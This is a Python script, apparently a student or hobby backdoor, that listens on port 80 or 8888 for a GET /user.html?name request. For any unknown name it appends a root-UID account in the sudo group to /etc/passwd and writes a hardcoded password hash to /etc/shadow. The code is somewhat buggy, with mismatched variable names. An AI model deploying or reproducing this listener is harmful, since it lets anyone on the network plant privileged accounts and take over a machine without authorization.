import socket
#import commands
# this library allows us to execute the commands

#get the users from /etc/passwd.
def users():
    users = []
    with open("/etc/passwd","r") as file:
        for i in (file):
            users.append(i.split(":")[0])
        return users

#coger gid de sudo para usarlo en la creacion del usuario a grupo sudo /etc/group
"""
lo que hago es pillar el gid de sudo del archivo /etc/group 
para despues usarlor en la creacion del usuario.
"""
def ADDgroup():
    try:
        with open("/etc/group","r") as file:
            for i in file:
                x = i.split(":")
                if x[0]=="sudo":
                    gID = x[2]
                    return(gID)
    except Exception as NOgroup:
        print("no se puede agregar al usuario a sudo al usuario: {}".format(NOgroup))

#Ayadiendo usuario a /etc/passwd
def UserCreation(UserName, gropuID):
    try:
        with open("/etc/passwd", "a") as userAdd:
            userAdd.write("{}:x:0:{}::/tmp:/bin/sh\n".format(userName, gropuID))#el gid de la funcion anterior lo uso aqui
            print("User:: {} added!".format(UserName))
            return "user succesfully added: {}".format(UserName)
    except Exception as NoADD:
        print("the user couldn't be added Error: {}".format(NoADD))

#podriamos agregar el usuario usando esta funcion tambien
"""
#User add
def UserCreation(UserName):
    try:
        adduser = commands.getstatusoutput('useradd  -d /tmp {}'.format(UserName))
        linkGroup = commands.getstatusoutput('usermod -a -G sudo {}'.format(userName))#add the user in the group sudo
        prove = commands.getstatusoutput('id {}'.format(UserName))#display the user infromation 
        print("User:: {} added!".format(UserName))
        print(prove)
    except Exception:
        print("Can't add user::: {}".format(UserName))
"""

#Ayadiendo usuario a /etc/shadow
def PASScreat(userName):
    try:
        with open("/etc/shadow", "a") as userPass:
            userPass.write("{}:$6$LwVCbLQa$slW1yMFXR2uHsgPzi18OoUWo2ARtxoA8f9NQL8lr0v0ezPNB.Ts.rhafERmTFR43ZN0iDGwTanH1gml3FRjsP1:18403:0:99999:7:::\n".format(userName))
            print("User Password of:: {} added!".format(UserName))
    except Exception as NoPASS:
        print("the user couldn't set the password: {}".format(NoPASS))

#creating the socket
try:
    mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    print("Scoket Created! {}".format(mySocket))
except socket.error as ErrorCreation:
    print("Couldn't Create the Socket Error::{}".format(ErrorCreation))

#scoket connections 
def connectionPort(host):
    try:
        port = 80
        conn80 = mySocket.bind((host, port))
        print("You're connected to port:: {}".format(port))
        return conn80
    except socket.error as NotSudo:
        print("It seems that there is an Error:: {}".format(NotSudo))
        port = 8888
        conn8888 = mySocket.bind((host, port))
        print("You're connected to port:: {}".format(port))
        return conn8888
#Check the connection 
connectionPort('')
mySocket.listen(1)

#loop 
while True:
    client, add = mySocket.accept()
    msgHost = client.recv(1024)
    msgHost = msgHost.decode('utf-8')#Turn the message into a string
    #using split() to get the name of the user
    separate = msgHost.split("\n")
    url = separate[0]

    url = url.split('?')
    url2 = url[1]#aqui puede que de un index fuera de rango, pero esta bien, solo ejecutas el programa otra ves como sudo
    Weburl = url[0]
    print(Weburl)

    getName = url2.split()
    userName = getName[0]
    print("User name:: {}".format(userName))
    if Weburl == "GET /user.html":
        client.send(b"GOOD: Page user found/")
        if userName in users():#check if the user is in the /etc/passwd file

            client.send(b'User found in the System/')
        else:#if the user isn't in the /etc/passwd file, is created 
            client.send(b'User not found/ Creating user...')
            #funcion para coger la gid de sudo gidSudo = 27
            groupID = ADDgroup()
            #funciones de crear usuarios y password
            Bytes = str.encode(str(UserCreation(userName,groupID)),'utf-8')
            Bytes2 = str.encode(str(PASScreat(userName)),'utf-8')
            #envia mensajes al cliente
            client.send(Bytes)
            client.send(Bytes2)
    client.close()
mySocket.close()